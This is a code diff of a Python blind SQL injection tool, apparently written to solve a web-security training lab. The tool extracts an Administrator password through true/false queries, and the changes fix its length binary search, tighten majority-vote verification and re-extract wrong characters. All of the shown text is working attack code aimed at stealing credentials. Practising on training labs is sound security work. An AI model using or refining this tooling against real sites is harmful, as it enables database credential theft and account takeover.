@@ -108,28 +108,26 @@ class ConditionalOracle:
         for _ in range(3):
             if self.healthy():
                 return True
-            print("[!] Canary check failed (session expired / throttling) — waiting 3s ...")
+            print("[!] Canary check failed (session expired / throttling) - waiting 3s ...")
             time.sleep(3)
         return False
 
     def length(self) -> int:
         sub = self.subselect()
-        lo = 0
         for _ in range(self.args.retries):
+            # smallest n for which LENGTH > n is false -> n is the length
             lo, hi = 0, self.args.max_length
             while lo < hi:
-                mid = (lo + hi + 1) // 2
+                mid = (lo + hi) // 2
                 if self.ask(f"SELECT LENGTH(({sub})) > {mid}"):
-                    lo = mid
+                    lo = mid + 1
                 else:
-                    hi = mid - 1
+                    hi = mid
             if lo == 0:
                 return 0
-            if self.ask_majority(f"SELECT LENGTH(({sub})) = {lo}") and not (
-                self.ask_majority(f"SELECT LENGTH(({sub})) = {lo + 1}")
-            ):
+            if self.ask_majority(f"SELECT LENGTH(({sub})) = {lo}"):
                 return lo
-            print("[!] Length verification inconsistent — redoing search ...")
+            print("[!] Length verification inconsistent - redoing search ...")
         return lo
 
     def bit_condition(self, pos: int, bit: int) -> str:
@@ -181,7 +179,7 @@ class ConditionalOracle:
     def fix_positions(self, codes: dict) -> None:
         bad = self.verify_positions(codes)
         for pos in sorted(bad):
-            print(f"[!] Position {pos}: parallel result unverified — re-extracting ...")
+            print(f"[!] Position {pos}: parallel result unverified - re-extracting ...")
             ch = self.char_at_sequential(pos)
             if ch != "?":
                 codes[pos] = ord(ch)
@@ -192,7 +190,10 @@ class ConditionalOracle:
         return codes
 
     def verify_full(self, extracted: str) -> bool:
-        return self.ask_majority(f"SELECT ({self.subselect()}) = '{extracted}'")
+        # strict 4-of-5: a plain majority can false-pass on a noisy oracle
+        cond = f"SELECT ({self.subselect()}) = '{extracted}'"
+        results = list(self.pool.map(lambda _: self.ask(cond), range(5)))
+        return sum(results) >= 4
 
 
 def sanity_check(oracle: ConditionalOracle) -> None:
@@ -236,23 +237,36 @@ def main() -> None:
             f"SELECT LENGTH(({oracle.subselect()})) > {count}", 3
         ):
             count += 1
-            print(f"[!] Password longer than expected — adding position {count}")
+            print(f"[!] Password longer than expected - adding position {count}")
             new = oracle.extract_parallel([count])
             oracle.fix_positions(new)
             codes.update(new)
             extracted = "".join(chr(codes[p]) for p in sorted(codes))
             print(f"[*] Progress: {extracted}")
 
-        print(f"[*] Final verification (3 votes) ...")
-        if oracle.verify_full(extracted):
-            print("[+] Verified: string matches the stored value exactly")
-        else:
-            print("[!] Full-string verification FAILED — re-checking positions ...")
+        print("[*] Final verification (5 votes) ...")
+        verified = False
+        for _ in range(3):
+            if oracle.verify_full(extracted):
+                verified = True
+                break
+            print("[!] Full-string verification FAILED - re-checking positions ...")
+            fixed_any = False
             for pos in sorted(codes):
-                if not oracle.ask(oracle.char_condition(pos, "=", codes[pos])):
+                if not oracle.ask_majority(oracle.char_condition(pos, "=", codes[pos])):
                     print(f"[!]   position {pos}: {chr(codes[pos])!r} is wrong")
-            if oracle.ask(f"SELECT LENGTH(({oracle.subselect()})) > {len(extracted)}"):
+                    ch = oracle.char_at_sequential(pos)
+                    if ch != "?":
+                        codes[pos] = ord(ch)
+                        fixed_any = True
+            if oracle.ask_majority(
+                f"SELECT LENGTH(({oracle.subselect()})) > {len(extracted)}"
+            ):
                 print(f"[!]   password is longer than {len(extracted)} chars!")
+            if not fixed_any:
+                break
+            extracted = "".join(chr(codes[p]) for p in sorted(codes))
+            print(f"[*] Progress: {extracted}")
     except KeyboardInterrupt:
         print("\n[!] Interrupted by user")
         sys.exit(130)
@@ -261,10 +275,16 @@ def main() -> None:
 
     elapsed = time.time() - start
     print("=" * 60)
+    if verified:
+        print(f"[+] Verified: string matches the stored value exactly")
+    else:
+        print("[!] UNVERIFIED: result may be wrong - do not rely on it")
     print(f"[+] Administrator password (repr): {extracted!r} ({len(extracted)} chars)")
     print(f"[+] Requests: {oracle.requests_sent} in {elapsed:.1f}s")
     print("=" * 60)
     print("Next: log in as Administrator with this password to solve the lab.")
+    if not verified:
+        sys.exit(1)
 
 
 if __name__ == "__main__":
